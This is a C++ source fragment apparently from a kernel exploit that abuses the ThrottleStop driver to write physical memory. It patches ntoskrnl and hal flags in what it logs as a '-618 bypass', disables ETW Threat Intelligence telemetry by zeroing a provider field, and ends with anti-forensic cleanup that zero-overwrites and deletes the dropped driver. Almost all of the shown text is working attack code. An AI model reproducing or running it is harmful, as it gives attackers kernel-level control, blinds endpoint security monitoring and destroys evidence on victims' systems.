    DbgLog("[ThrottleStop] Writing 1 to ntoskrnl flag...");
    if (!WritePhysical(ntoskrnlFlagPA, newValue)) {
        SetError("Failed to write ntoskrnl flag");
        return false;
    }

    DbgLog("[ThrottleStop] Writing 1 to hal flag...");
    if (!WritePhysical(halFlagPA, newValue)) {
        SetError("Failed to write hal flag");
        return false;
    }

    // Verify writes
    DbgLog("[ThrottleStop] Verifying writes...");
    uint8_t verifyNtoskrnl = 0, verifyHal = 0;
    ReadPhysical(ntoskrnlFlagPA, verifyNtoskrnl);
    ReadPhysical(halFlagPA, verifyHal);

    DbgLog("[ThrottleStop] AFTER: ntoskrnl=%u (0x%02X) hal=%u (0x%02X)",
           verifyNtoskrnl, verifyNtoskrnl, verifyHal, verifyHal);

    if (verifyNtoskrnl != 1 || verifyHal != 1) {
        SetError("Flag verification FAILED: ntoskrnl=%u hal=%u (expected 1)",
                 verifyNtoskrnl, verifyHal);
        return false;
    }

    DbgLog("[ThrottleStop] ============================================");
    DbgLog("[ThrottleStop] -618 BYPASS SUCCESSFUL!");
    DbgLog("[ThrottleStop] LDR_OPEN should now work!");
    DbgLog("[ThrottleStop] ============================================");
    return true;
}

//-----------------------------------------------------------------------------
// ETW Blinding (Pre-Hypervisor)
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::DisableEtwTi(uint64_t ntoskrnlBase, uint64_t offset)
{
    DbgLog("[ThrottleStop] Disabling ETW-TI at ntoskrnl+0x%llX", offset);

    // Calculate address of EtwThreatIntProvRegHandle
    uint64_t regHandleVA = ntoskrnlBase + offset;
    uint64_t regHandlePA = 0;

    if (!TranslateVirtToPhys(0, regHandleVA, regHandlePA)) {
        SetError("Failed to translate EtwThreatIntProvRegHandle VA");
        return false;
    }

    // Read ETW_REG_ENTRY pointer
    uint64_t regEntry = 0;
    if (!ReadPhysical(regHandlePA, regEntry)) {
        SetError("Failed to read ETW_REG_ENTRY pointer");
        return false;
    }

    if (regEntry == 0) {
        SetError("ETW_REG_ENTRY is null");
        return false;
    }

    // Read ETW_GUID_ENTRY pointer at offset 0x20
    uint64_t guidEntryVA = regEntry + 0x20;
    uint64_t guidEntryPA = 0;
    if (!TranslateVirtToPhys(0, guidEntryVA, guidEntryPA)) {
        SetError("Failed to translate GuidEntry VA");
        return false;
    }

    uint64_t guidEntry = 0;
    if (!ReadPhysical(guidEntryPA, guidEntry)) {
        SetError("Failed to read ETW_GUID_ENTRY pointer");
        return false;
    }

    if (guidEntry == 0) {
        SetError("ETW_GUID_ENTRY is null");
        return false;
    }

    // ProviderEnableInfo is at offset 0x60
    uint64_t providerEnableVA = guidEntry + 0x60;
    uint64_t providerEnablePA = 0;
    if (!TranslateVirtToPhys(0, providerEnableVA, providerEnablePA)) {
        SetError("Failed to translate ProviderEnableInfo VA");
        return false;
    }

    // Save current value for restoration
    if (!ReadPhysical(providerEnablePA, m_EtwSavedValue)) {
        SetError("Failed to read ProviderEnableInfo");
        return false;
    }

    DbgLog("[ThrottleStop] ETW-TI current value: 0x%016llX", m_EtwSavedValue);

    // Zero it to disable
    uint64_t zeroValue = 0;
    if (!WritePhysical(providerEnablePA, zeroValue)) {
        SetError("Failed to write ProviderEnableInfo");
        return false;
    }

    DbgLog("[ThrottleStop] ETW-TI disabled");
    return true;
}

bool ThrottleStopExploit::EnableEtwTi(uint64_t ntoskrnlBase, uint64_t offset, uint64_t savedValue)
{
    DbgLog("[ThrottleStop] Restoring ETW-TI with value 0x%016llX", savedValue);

    // Same navigation as DisableEtwTi
    uint64_t regHandleVA = ntoskrnlBase + offset;
    uint64_t regHandlePA = 0;

    if (!TranslateVirtToPhys(0, regHandleVA, regHandlePA)) {
        SetError("Failed to translate EtwThreatIntProvRegHandle VA");
        return false;
    }

    uint64_t regEntry = 0;
    if (!ReadPhysical(regHandlePA, regEntry)) {
        SetError("Failed to read ETW_REG_ENTRY pointer");
        return false;
    }

    uint64_t guidEntryVA = regEntry + 0x20;
    uint64_t guidEntryPA = 0;
    if (!TranslateVirtToPhys(0, guidEntryVA, guidEntryPA)) {
        SetError("Failed to translate GuidEntry VA");
        return false;
    }

    uint64_t guidEntry = 0;
    if (!ReadPhysical(guidEntryPA, guidEntry)) {
        SetError("Failed to read ETW_GUID_ENTRY pointer");
        return false;
    }

    uint64_t providerEnableVA = guidEntry + 0x60;
    uint64_t providerEnablePA = 0;
    if (!TranslateVirtToPhys(0, providerEnableVA, providerEnablePA)) {
        SetError("Failed to translate ProviderEnableInfo VA");
        return false;
    }

    // Restore saved value
    if (!WritePhysical(providerEnablePA, savedValue)) {
        SetError("Failed to restore ProviderEnableInfo");
        return false;
    }

    DbgLog("[ThrottleStop] ETW-TI restored");
    return true;
}

//-----------------------------------------------------------------------------
// Cleanup
//-----------------------------------------------------------------------------

void ThrottleStopExploit::CleanupArtifacts()
{
    // Delete the driver file if we deployed it
    if (!m_DriverPath.empty()) {
        // Attempt secure deletion
        HANDLE hFile = CreateFileW(
            m_DriverPath.c_str(),
            GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            // Overwrite with zeros
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize)) {
                std::vector<uint8_t> zeros(4096, 0);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(zeros.size()), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeros.data(), toWrite, &written, nullptr);
                    remaining -= written;
                }
            }
            CloseHandle(hFile);
        }

        DeleteFileW(m_DriverPath.c_str());
    }
}

void ThrottleStopExploit::Cleanup()
{
    DbgLog("[ThrottleStop] Cleanup starting...");

    // Close device handle
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }

    // Stop and delete service
    if (m_bDriverDeployed) {
        StopDriverService();
        DeleteDriverService();
        m_bDriverDeployed = false;
    }

    // Clean up artifacts
    CleanupArtifacts();

    m_bInitialized = false;
    m_SystemCr3 = 0;

    DbgLog("[ThrottleStop] Cleanup complete");
}

} // namespace throttlestop
